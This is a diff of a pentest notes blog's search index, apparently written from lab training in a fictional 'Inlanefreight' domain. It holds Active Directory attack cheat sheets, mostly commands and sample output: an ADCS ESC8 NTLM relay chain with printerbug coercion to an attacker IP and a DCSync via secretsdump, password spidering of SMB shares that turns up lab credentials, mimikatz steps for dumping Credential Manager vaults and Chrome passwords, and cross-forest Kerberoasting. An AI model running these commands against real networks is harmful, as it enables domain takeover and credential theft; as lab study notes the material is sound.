@@ -1,49 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>ADCS : ESC8</title>
-    <url>/2025/11/30/ADCS-ESC8/</url>
-    <content><![CDATA[<h3 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h3><p>Search for vulnerable certificate templates</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">certipy find -u username -p password -dc-ip &lt;DC-IP&gt; -target &lt;DC-Name&gt; -enabled -vulnerable -stdout</span><br></pre></td></tr></table></figure>
-
-<p>Identify ADCS Enrollment Services and Certificate Template Names</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nxc ldap target -u username -p password -M adcs</span><br></pre></td></tr></table></figure>
-
-<p>Enumerate ADCS over SMB</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nxc smb target -M enum_ca</span><br></pre></td></tr></table></figure>
-
-<h3 id="Start-NTLM-Relay-to-ADCS-Web-Enrollment"><a href="#Start-NTLM-Relay-to-ADCS-Web-Enrollment" class="headerlink" title="Start NTLM Relay to ADCS Web Enrollment"></a>Start NTLM Relay to ADCS Web Enrollment</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-ntlmrelayx -t http://domain/certsrv/certfnsh.asp -smb2support --adcs --template &lt;CERT-TEMPLATE&gt; --no-http-server --no-wcf-server --no-raw-server</span><br></pre></td></tr></table></figure>
-
-<p>Or</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">certipy relay -target <span class="string">&#x27;http://&lt;DC-Name.domain&gt;/&#x27;</span> -template &lt;CERT-TEMPLATE&gt;</span><br></pre></td></tr></table></figure>
-
-<p><code>➜ After running the coerce tool, these commands will generate a .pfx certificate file for the DC machine.</code></p>
-<h3 id="Force-Machine-Authentication"><a href="#Force-Machine-Authentication" class="headerlink" title="Force Machine Authentication"></a>Force Machine Authentication</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 printerbug.py &lt;DOMAIN&gt;/&lt;USERNAME&gt;:&lt;PASSWORD&gt;@&lt;DC-IP&gt; &lt;ATTACKER-IP&gt;</span><br></pre></td></tr></table></figure>
-
-
-<h3 id="Request-TGT"><a href="#Request-TGT" class="headerlink" title="Request TGT"></a>Request TGT</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 gettgtpkinit.py -cert-pfx &lt;PATH-TO-PFX&gt; -dc-ip &lt;DC-IP&gt; <span class="string">&#x27;&lt;DOMAIN&gt;/&lt;MACHINE-ACCOUNT&gt;$&#x27;</span> &lt;OUTPUT-CCACHE&gt;</span><br></pre></td></tr></table></figure>
-
-<p>Or </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">certipy auth -pfx &lt;OUTPUT-CCACHE&gt; -dc-ip &lt;DC-IP&gt; </span><br></pre></td></tr></table></figure>
-
-
-<h3 id="Set-Kerberos-Cache-to-Use-the-TGT"><a href="#Set-Kerberos-Cache-to-Use-the-TGT" class="headerlink" title="Set Kerberos Cache to Use the TGT"></a>Set Kerberos Cache to Use the TGT</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> KRB5CCNAME=&lt;OUTPUT-CCACHE&gt;</span><br></pre></td></tr></table></figure>
-
-<h3 id="Perform-DCSync"><a href="#Perform-DCSync" class="headerlink" title="Perform DCSync"></a>Perform DCSync</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-secretsdump -k -no-pass -dc-ip &lt;DC-IP&gt; -just-dc-user &lt;TARGET-USER&gt; <span class="string">&#x27;&lt;DOMAIN&gt;/&lt;MACHINE-ACCOUNT&gt;$&#x27;</span>@&lt;DC-HOSTNAME&gt;</span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>Active Directory</category>
-        <category>Windows</category>
-        <category>Exploitation</category>
-        <category>ADCS</category>
-      </categories>
-      <tags>
-        <tag>ESC8</tag>
-        <tag>Certipy</tag>
-        <tag>impacket-ntlmrelayx</tag>
-        <tag>printerbug</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>AD : ACLs</title>
     <url>/2025/12/02/AD-ACLs/</url>
     <content><![CDATA[<h1 id="ForceChangePassword"><a href="#ForceChangePassword" class="headerlink" title="ForceChangePassword"></a>ForceChangePassword</h1><blockquote>
@@ -192,14 +149,57 @@
         <category>ACLs</category>
       </categories>
       <tags>
-        <tag>Certipy</tag>
         <tag>netexec</tag>
+        <tag>Certipy</tag>
         <tag>dacledit</tag>
         <tag>owneredit</tag>
         <tag>bloodyAD</tag>
         <tag>secretsdump</tag>
         <tag>PowerView</tag>
         <tag>net</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ADCS : ESC8</title>
+    <url>/2025/11/30/ADCS-ESC8/</url>
+    <content><![CDATA[<h3 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h3><p>Search for vulnerable certificate templates</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">certipy find -u username -p password -dc-ip &lt;DC-IP&gt; -target &lt;DC-Name&gt; -enabled -vulnerable -stdout</span><br></pre></td></tr></table></figure>
+
+<p>Identify ADCS Enrollment Services and Certificate Template Names</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nxc ldap target -u username -p password -M adcs</span><br></pre></td></tr></table></figure>
+
+<p>Enumerate ADCS over SMB</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nxc smb target -M enum_ca</span><br></pre></td></tr></table></figure>
+
+<h3 id="Start-NTLM-Relay-to-ADCS-Web-Enrollment"><a href="#Start-NTLM-Relay-to-ADCS-Web-Enrollment" class="headerlink" title="Start NTLM Relay to ADCS Web Enrollment"></a>Start NTLM Relay to ADCS Web Enrollment</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-ntlmrelayx -t http://domain/certsrv/certfnsh.asp -smb2support --adcs --template &lt;CERT-TEMPLATE&gt; --no-http-server --no-wcf-server --no-raw-server</span><br></pre></td></tr></table></figure>
+
+<p>Or</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">certipy relay -target <span class="string">&#x27;http://&lt;DC-Name.domain&gt;/&#x27;</span> -template &lt;CERT-TEMPLATE&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>➜ After running the coerce tool, these commands will generate a .pfx certificate file for the DC machine.</code></p>
+<h3 id="Force-Machine-Authentication"><a href="#Force-Machine-Authentication" class="headerlink" title="Force Machine Authentication"></a>Force Machine Authentication</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 printerbug.py &lt;DOMAIN&gt;/&lt;USERNAME&gt;:&lt;PASSWORD&gt;@&lt;DC-IP&gt; &lt;ATTACKER-IP&gt;</span><br></pre></td></tr></table></figure>
+
+
+<h3 id="Request-TGT"><a href="#Request-TGT" class="headerlink" title="Request TGT"></a>Request TGT</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 gettgtpkinit.py -cert-pfx &lt;PATH-TO-PFX&gt; -dc-ip &lt;DC-IP&gt; <span class="string">&#x27;&lt;DOMAIN&gt;/&lt;MACHINE-ACCOUNT&gt;$&#x27;</span> &lt;OUTPUT-CCACHE&gt;</span><br></pre></td></tr></table></figure>
+
+<p>Or </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">certipy auth -pfx &lt;OUTPUT-CCACHE&gt; -dc-ip &lt;DC-IP&gt; </span><br></pre></td></tr></table></figure>
+
+
+<h3 id="Set-Kerberos-Cache-to-Use-the-TGT"><a href="#Set-Kerberos-Cache-to-Use-the-TGT" class="headerlink" title="Set Kerberos Cache to Use the TGT"></a>Set Kerberos Cache to Use the TGT</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> KRB5CCNAME=&lt;OUTPUT-CCACHE&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Perform-DCSync"><a href="#Perform-DCSync" class="headerlink" title="Perform DCSync"></a>Perform DCSync</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-secretsdump -k -no-pass -dc-ip &lt;DC-IP&gt; -just-dc-user &lt;TARGET-USER&gt; <span class="string">&#x27;&lt;DOMAIN&gt;/&lt;MACHINE-ACCOUNT&gt;$&#x27;</span>@&lt;DC-HOSTNAME&gt;</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>Active Directory</category>
+        <category>Windows</category>
+        <category>Exploitation</category>
+        <category>ADCS</category>
+      </categories>
+      <tags>
+        <tag>Certipy</tag>
+        <tag>ESC8</tag>
+        <tag>impacket-ntlmrelayx</tag>
+        <tag>printerbug</tag>
       </tags>
   </entry>
   <entry>
@@ -263,96 +263,6 @@
         <tag>secretsdump</tag>
         <tag>lookupsid</tag>
         <tag>ticketer</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Credential Hunting in Network Shares</title>
-    <url>/2025/11/27/Credential-Hunting-in-Network-Shares/</url>
-    <content><![CDATA[<h1 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h1><h2 id="From-Domain-Joined-Machine"><a href="#From-Domain-Joined-Machine" class="headerlink" title="From Domain Joined Machine"></a>From Domain Joined Machine</h2><h3 id="Snaffler"><a href="#Snaffler" class="headerlink" title="Snaffler"></a>Snaffler</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">c:\Users\Public&gt;Snaffler.exe <span class="literal">-s</span></span><br></pre></td></tr></table></figure>
-
-
-<ul>
-<li><code>-u : retrieves a list of users from Active Directory and searches for references to them in files</code></li>
-<li><code>-i and -n allow you to specify which shares should be included in the search.</code></li>
-</ul>
-<h2 id="Non-Domain-Joined-Machine"><a href="#Non-Domain-Joined-Machine" class="headerlink" title="Non Domain Joined Machine"></a>Non Domain Joined Machine</h2><h3 id="PowerHuntShares"><a href="#PowerHuntShares" class="headerlink" title="PowerHuntShares"></a>PowerHuntShares</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Unblock-File</span> <span class="literal">-Path</span> C:\Users\Public\PowerHuntShares\PowerHuntShares.psm1</span><br><span class="line"><span class="built_in">Import-Module</span> C:\Users\Public\PowerHuntShares\PowerHuntShares.psm1</span><br><span class="line"><span class="built_in">Invoke-HuntSMBShares</span> <span class="literal">-Threads</span> <span class="number">100</span> <span class="literal">-OutputDirectory</span> c:\Users\Public</span><br><span class="line"></span><br><span class="line">[*][<span class="number">05</span>/<span class="number">01</span>/<span class="number">2025</span> <span class="number">12</span>:<span class="number">51</span>] Output Directory: c:\Users\Public\SmbShareHunt<span class="literal">-05012025125123</span></span><br></pre></td></tr></table></figure>
-
-
-<h1 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h1><h3 id="MANSPIDER"><a href="#MANSPIDER" class="headerlink" title="MANSPIDER"></a>MANSPIDER</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">manspider 10.129.182.89 -c <span class="string">&#x27;passw&#x27;</span> -u <span class="string">&#x27;mendres&#x27;</span> -p <span class="string">&#x27;Inlanefreight2025!&#x27;</span></span><br><span class="line"></span><br><span class="line">[+] 10.129.182.89\Company\Forms\HR_Form_14.pdf: matched <span class="string">&quot;passw&quot;</span> 1 <span class="built_in">times</span></span><br><span class="line">[+] password: SecureDocs99</span><br><span class="line">[+] 10.129.182.89\Company\Forms\Incident_Report_57.xlsx: matched <span class="string">&quot;passw&quot;</span> 1 <span class="built_in">times</span></span><br><span class="line">[+] password=Summer2023!</span><br><span class="line"></span><br><span class="line">&lt;snip&gt;</span><br><span class="line"></span><br><span class="line">[+] 10.129.182.89\IT\Tools\split_tunnel.txt: matched <span class="string">&quot;passw&quot;</span> 1 <span class="built_in">times</span></span><br><span class="line">[+] <span class="comment"># Auth backup password: INLANEFREIGHT\jbader:ILovePower333###</span></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">manspider 10.129.182.89 -c <span class="string">&#x27;INLANEFREIGHT&#x27;</span> -u <span class="string">&#x27;mendres&#x27;</span> -p <span class="string">&#x27;Inlanefreight2025!&#x27;</span></span><br><span class="line"></span><br><span class="line">[+] 10.129.182.89\IT\Tools\split_tunnel.txt: matched <span class="string">&quot;INLANEFREIGHT&quot;</span> 1 <span class="built_in">times</span></span><br><span class="line">[+] <span class="comment"># Auth backup password: INLANEFREIGHT\jbader:ILovePower333###</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="Netexec"><a href="#Netexec" class="headerlink" title="Netexec"></a>Netexec</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nxc smb 10.129.234.121 -u mendres -p <span class="string">&#x27;Inlanefreight2025!&#x27;</span> --spider IT --content --pattern <span class="string">&quot;passw&quot;</span></span><br><span class="line"></span><br><span class="line">SMB         10.129.234.121  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:inlanefreight.local) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         10.129.234.121  445    DC01             [+] inlanefreight.local\mendres:Inlanefreight2025! </span><br><span class="line">SMB         10.129.234.121  445    DC01             [*] Started spidering</span><br><span class="line">SMB         10.129.234.121  445    DC01             [*] Spidering .</span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure>
-
-<p>We can also download the files locally:</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nxc smb 104.152.52.235 -u mendres -p Inlanefreight2025! -M spider_plus -o DOWNLOAD_FLAG=True</span><br></pre></td></tr></table></figure>
-
-<p>Then search for the pattern we want:</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp/nxc_hosted/nxc_spider_plus/10.129.234.173</span><br><span class="line"></span><br><span class="line">grep -ri <span class="string">&quot;passw&quot;</span> .</span><br></pre></td></tr></table></figure>
-
-<p>Example result</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp/nxc_hosted/nxc_spider_plus/10.129.234.173</span><br><span class="line"></span><br><span class="line">grep -ri <span class="string">&quot;passw&quot;</span> .</span><br><span class="line"></span><br><span class="line">Auth backup password: INLANEFREIGHT\jbader:ILovePower333###</span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>Active Directory</category>
-        <category>Service-Enumeration</category>
-        <category>SMB</category>
-      </categories>
-      <tags>
-        <tag>SMB</tag>
-        <tag>Enumeration</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>DPAPI</title>
-    <url>/2025/11/26/DPAPI/</url>
-    <content><![CDATA[<h2 id="Default-Location"><a href="#Default-Location" class="headerlink" title="Default Location"></a>Default Location</h2><p>Credentials are stored in special encrypted folders on the computer under the user and system profiles : </p>
-<ul>
-<li><code>%UserProfile%\AppData\Local\Microsoft\Vault\</code></li>
-<li><code>%UserProfile%\AppData\Local\Microsoft\Credentials\</code></li>
-<li><code>%UserProfile%\AppData\Roaming\Microsoft\Vault\</code></li>
-<li><code>%ProgramData%\Microsoft\Vault\</code></li>
-<li><code>%SystemRoot%\System32\config\systemprofile\AppData\Roaming\Microsoft\Vault\</code></li>
-</ul>
-<h2 id="Two-Main-Types-of-Stored-Credentials"><a href="#Two-Main-Types-of-Stored-Credentials" class="headerlink" title="Two Main Types of Stored Credentials:"></a>Two Main Types of Stored Credentials:</h2><h6 id="Web-Credentials"><a href="#Web-Credentials" class="headerlink" title="Web Credentials"></a>Web Credentials</h6><ul>
-<li>Website passwords.</li>
-<li>Online account logins</li>
-</ul>
-<h6 id="Windows-Credentials"><a href="#Windows-Credentials" class="headerlink" title="Windows Credentials"></a>Windows Credentials</h6><ul>
-<li>Network shares (like <code>\\server\share</code>)</li>
-<li>Domain user logins</li>
-<li>Services (OneDrive, etc.)</li>
-<li>Remote desktop connections</li>
-</ul>
-<h2 id="Enumerate-All-vaults"><a href="#Enumerate-All-vaults" class="headerlink" title="Enumerate All vaults"></a>Enumerate All vaults</h2><p><code>➜ they are different, so we need to use both of them :</code></p>
-<p>For standard vaults </p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\sadams&gt; vaultcmd /list</span><br><span class="line"></span><br><span class="line">Currently loaded vaults:</span><br><span class="line"></span><br><span class="line">	Vault: Web Credentials</span><br><span class="line">	Vault Guid:<span class="number">4</span>BF4C442<span class="literal">-9B8A-41A0-B380-DD4A704DDB28</span></span><br><span class="line">	Location: C:\Users\sadams\AppData\Local\Microsoft\Vault\<span class="number">4</span>BF4C442<span class="literal">-9B8A-41A0-B380-DD4A704DDB28</span></span><br><span class="line">	</span><br><span class="line">	Vault: Windows Credentials</span><br><span class="line">	Vault Guid:<span class="number">77</span>BC582B<span class="literal">-F0A6-4E15-4E80-61736B6F3B29</span></span><br><span class="line">	Location: C:\Users\sadams\AppData\Local\Microsoft\Vault</span><br></pre></td></tr></table></figure>
-
-<p>For stored credentials</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Temp&gt; cmdkey /list </span><br><span class="line"></span><br><span class="line">Currently stored credentials: </span><br><span class="line"></span><br><span class="line">Target: WindowsLive: target=virtualapp/didlogical </span><br><span class="line"><span class="built_in">Type</span>: Generic </span><br><span class="line">User: <span class="number">02</span>jejfxhvabjneqt </span><br><span class="line">Local machine persistence </span><br><span class="line"></span><br><span class="line">Target: LegacyGeneric: target=onedrive.live.com </span><br><span class="line"><span class="built_in">Type</span>: Generic </span><br><span class="line">User: mcharles@inlanefreight.local</span><br><span class="line"></span><br><span class="line">Target: Domain:interactive=SRV01\mcharles</span><br><span class="line"><span class="built_in">Type</span>: Domain Password</span><br><span class="line">User: SRV01\mcharles</span><br></pre></td></tr></table></figure>
-
-
-<p>Credentials marked with <code>Local machine persistence</code> survive reboots.</p>
-<h2 id="Enumerate-Specific-vault"><a href="#Enumerate-Specific-vault" class="headerlink" title="Enumerate Specific vault"></a>Enumerate Specific vault</h2><h4 id="Web-Credentials-1"><a href="#Web-Credentials-1" class="headerlink" title="Web Credentials"></a>Web Credentials</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\sadams&gt; vaultcmd /listcreds:<span class="string">&quot;Web Credentials&quot;</span> /all</span><br></pre></td></tr></table></figure>
-
-
-<h4 id="Windows-Credentials-1"><a href="#Windows-Credentials-1" class="headerlink" title="Windows Credentials"></a>Windows Credentials</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\sadams&gt; vaultcmd /listcreds:<span class="string">&quot;Windows Credentials&quot;</span> /all</span><br><span class="line"></span><br><span class="line">Credentials <span class="keyword">in</span> vault: Windows Credentials</span><br><span class="line"></span><br><span class="line">Credential schema: Windows Domain Password Credential</span><br><span class="line">Resource: Domain:interactive=SRV01\mcharles</span><br><span class="line">Identity: SRV01\mcharles</span><br><span class="line"><span class="keyword">Hidden</span>: No</span><br><span class="line">Roaming: No</span><br><span class="line">Property (schema element id, value): (<span class="number">100</span>,<span class="number">3</span>)</span><br></pre></td></tr></table></figure>
-
-<p><code>Important: If the resource includes interactive, the credentials were used in an interactive logon and may be reused to impersonate the user with runas</code>.</p>
-<h2 id="Impersonate-User-In-general-it-doesn’t-need-admin-privilege"><a href="#Impersonate-User-In-general-it-doesn’t-need-admin-privilege" class="headerlink" title="Impersonate User ( In general, it doesn’t need admin privilege )"></a>Impersonate User ( In general, it doesn’t need admin privilege )</h2><p>Since the <code>mcharles</code> credential is associated with an <code>interactive session</code>, we can attempt to impersonate the user using <code>runas</code> :</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">C:\Users\sadams&gt; runas /savecred /user:SRV01\mcharles powershell.exe</span><br><span class="line"></span><br><span class="line">Attempting to <span class="built_in">start</span> cmd as user <span class="string">&quot;SRV01\mcharles&quot;</span> ...</span><br></pre></td></tr></table></figure>
-<p>➜ This will create a new <code>powershell</code> process.</p>
-<h2 id="Dump-Credentials"><a href="#Dump-Credentials" class="headerlink" title="Dump Credentials"></a>Dump Credentials</h2><p>➜ We need <code>Local Administrator access on the machine</code>.</p>
-<h4 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Dump all credentials from Credential Manager</span></span><br><span class="line">sekurlsa::credman</span><br><span class="line"></span><br><span class="line"><span class="comment"># Dump credentials with more details</span></span><br><span class="line">sekurlsa::vault</span><br><span class="line"></span><br><span class="line"><span class="comment"># List all credential vaults</span></span><br><span class="line">dpapi::vault /list</span><br><span class="line"></span><br><span class="line"><span class="comment"># Decrypt specific vault</span></span><br><span class="line">dpapi::vault /<span class="keyword">in</span>:<span class="string">&quot;C:\Users\username\AppData\Local\Microsoft\Vault\GUID\Policy.vpol&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Dump vault credentials</span></span><br><span class="line">dpapi::vault /<span class="keyword">in</span>:vaultfile /masterkey:masterkey</span><br><span class="line"></span><br><span class="line"><span class="comment"># Decrypt Chrome/Edge saved passwords</span></span><br><span class="line">dpapi::chrome /<span class="keyword">in</span>:<span class="string">&quot;C:\Users\username\AppData\Local\Google\Chrome\User Data\Default\Login Data&quot;</span></span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>Active Directory</category>
-        <category>Windows</category>
-        <category>Post-Exploitation</category>
-        <category>Dump-Passwords</category>
-      </categories>
-      <tags>
-        <tag>Dump-DPAPI</tag>
       </tags>
   </entry>
   <entry>
@@ -420,6 +330,134 @@
       </tags>
   </entry>
   <entry>
+    <title>Credential Hunting in Network Shares</title>
+    <url>/2025/11/27/Credential-Hunting-in-Network-Shares/</url>
+    <content><![CDATA[<h1 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h1><h2 id="From-Domain-Joined-Machine"><a href="#From-Domain-Joined-Machine" class="headerlink" title="From Domain Joined Machine"></a>From Domain Joined Machine</h2><h3 id="Snaffler"><a href="#Snaffler" class="headerlink" title="Snaffler"></a>Snaffler</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">c:\Users\Public&gt;Snaffler.exe <span class="literal">-s</span></span><br></pre></td></tr></table></figure>
+
+
+<ul>
+<li><code>-u : retrieves a list of users from Active Directory and searches for references to them in files</code></li>
+<li><code>-i and -n allow you to specify which shares should be included in the search.</code></li>
+</ul>
+<h2 id="Non-Domain-Joined-Machine"><a href="#Non-Domain-Joined-Machine" class="headerlink" title="Non Domain Joined Machine"></a>Non Domain Joined Machine</h2><h3 id="PowerHuntShares"><a href="#PowerHuntShares" class="headerlink" title="PowerHuntShares"></a>PowerHuntShares</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Unblock-File</span> <span class="literal">-Path</span> C:\Users\Public\PowerHuntShares\PowerHuntShares.psm1</span><br><span class="line"><span class="built_in">Import-Module</span> C:\Users\Public\PowerHuntShares\PowerHuntShares.psm1</span><br><span class="line"><span class="built_in">Invoke-HuntSMBShares</span> <span class="literal">-Threads</span> <span class="number">100</span> <span class="literal">-OutputDirectory</span> c:\Users\Public</span><br><span class="line"></span><br><span class="line">[*][<span class="number">05</span>/<span class="number">01</span>/<span class="number">2025</span> <span class="number">12</span>:<span class="number">51</span>] Output Directory: c:\Users\Public\SmbShareHunt<span class="literal">-05012025125123</span></span><br></pre></td></tr></table></figure>
+
+
+<h1 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h1><h3 id="MANSPIDER"><a href="#MANSPIDER" class="headerlink" title="MANSPIDER"></a>MANSPIDER</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">manspider 10.129.182.89 -c <span class="string">&#x27;passw&#x27;</span> -u <span class="string">&#x27;mendres&#x27;</span> -p <span class="string">&#x27;Inlanefreight2025!&#x27;</span></span><br><span class="line"></span><br><span class="line">[+] 10.129.182.89\Company\Forms\HR_Form_14.pdf: matched <span class="string">&quot;passw&quot;</span> 1 <span class="built_in">times</span></span><br><span class="line">[+] password: SecureDocs99</span><br><span class="line">[+] 10.129.182.89\Company\Forms\Incident_Report_57.xlsx: matched <span class="string">&quot;passw&quot;</span> 1 <span class="built_in">times</span></span><br><span class="line">[+] password=Summer2023!</span><br><span class="line"></span><br><span class="line">&lt;snip&gt;</span><br><span class="line"></span><br><span class="line">[+] 10.129.182.89\IT\Tools\split_tunnel.txt: matched <span class="string">&quot;passw&quot;</span> 1 <span class="built_in">times</span></span><br><span class="line">[+] <span class="comment"># Auth backup password: INLANEFREIGHT\jbader:ILovePower333###</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">manspider 10.129.182.89 -c <span class="string">&#x27;INLANEFREIGHT&#x27;</span> -u <span class="string">&#x27;mendres&#x27;</span> -p <span class="string">&#x27;Inlanefreight2025!&#x27;</span></span><br><span class="line"></span><br><span class="line">[+] 10.129.182.89\IT\Tools\split_tunnel.txt: matched <span class="string">&quot;INLANEFREIGHT&quot;</span> 1 <span class="built_in">times</span></span><br><span class="line">[+] <span class="comment"># Auth backup password: INLANEFREIGHT\jbader:ILovePower333###</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Netexec"><a href="#Netexec" class="headerlink" title="Netexec"></a>Netexec</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nxc smb 10.129.234.121 -u mendres -p <span class="string">&#x27;Inlanefreight2025!&#x27;</span> --spider IT --content --pattern <span class="string">&quot;passw&quot;</span></span><br><span class="line"></span><br><span class="line">SMB         10.129.234.121  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:inlanefreight.local) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         10.129.234.121  445    DC01             [+] inlanefreight.local\mendres:Inlanefreight2025! </span><br><span class="line">SMB         10.129.234.121  445    DC01             [*] Started spidering</span><br><span class="line">SMB         10.129.234.121  445    DC01             [*] Spidering .</span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure>
+
+<p>We can also download the files locally:</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nxc smb 104.152.52.235 -u mendres -p Inlanefreight2025! -M spider_plus -o DOWNLOAD_FLAG=True</span><br></pre></td></tr></table></figure>
+
+<p>Then search for the pattern we want:</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp/nxc_hosted/nxc_spider_plus/10.129.234.173</span><br><span class="line"></span><br><span class="line">grep -ri <span class="string">&quot;passw&quot;</span> .</span><br></pre></td></tr></table></figure>
+
+<p>Example result</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp/nxc_hosted/nxc_spider_plus/10.129.234.173</span><br><span class="line"></span><br><span class="line">grep -ri <span class="string">&quot;passw&quot;</span> .</span><br><span class="line"></span><br><span class="line">Auth backup password: INLANEFREIGHT\jbader:ILovePower333###</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>Active Directory</category>
+        <category>Service-Enumeration</category>
+        <category>SMB</category>
+      </categories>
+      <tags>
+        <tag>SMB</tag>
+        <tag>Enumeration</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Cross-Forest : Kerberoasting</title>
+    <url>/2025/12/03/Cross-Forest-Kerberoasting/</url>
+    <content><![CDATA[<h1 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h1><blockquote>
+<p>To do this, we need credentials for a user that can authenticate into the other domain and specify the <code>-target-domain</code> flag in our command.</p>
+</blockquote>
+<h3 id="Enumerate-Users-With-SPN-On-The-Target-Domain"><a href="#Enumerate-Users-With-SPN-On-The-Target-Domain" class="headerlink" title="Enumerate Users With SPN On The Target Domain"></a>Enumerate Users With SPN On The Target Domain</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">GetUserSPNs.py -target-domain &lt;CrossDomainName&gt; domain/our-user</span><br></pre></td></tr></table></figure>
+
+<h3 id="Request-TGS"><a href="#Request-TGS" class="headerlink" title="Request TGS"></a>Request TGS</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">GetUserSPNs.py -request -target-domain &lt;CrossDomainName&gt; domain/our-user</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h1><h3 id="Enumerate-Users-With-SPN-On-The-Target-Domain-1"><a href="#Enumerate-Users-With-SPN-On-The-Target-Domain-1" class="headerlink" title="Enumerate Users With SPN On The Target Domain"></a>Enumerate Users With SPN On The Target Domain</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-DomainUser</span> <span class="literal">-SPN</span> <span class="literal">-Domain</span> &lt;CrossDomainName&gt; | <span class="built_in">select</span> SamAccountName</span><br><span class="line"></span><br><span class="line">samaccountname</span><br><span class="line"><span class="literal">--------------</span></span><br><span class="line">krbtgt</span><br><span class="line">mssqlsvc</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>➜  We see that there is one account with an SPN in the target domain which is <code>mssqlsvc</code>.</p>
+</blockquote>
+<h3 id="Performing-a-Kerberoasting"><a href="#Performing-a-Kerberoasting" class="headerlink" title="Performing a Kerberoasting"></a>Performing a Kerberoasting</h3><blockquote>
+<p>➜ It’s the same as normal kerberoasting but in this case we add <code>/domain</code> and specify the target domain.</p>
+</blockquote>
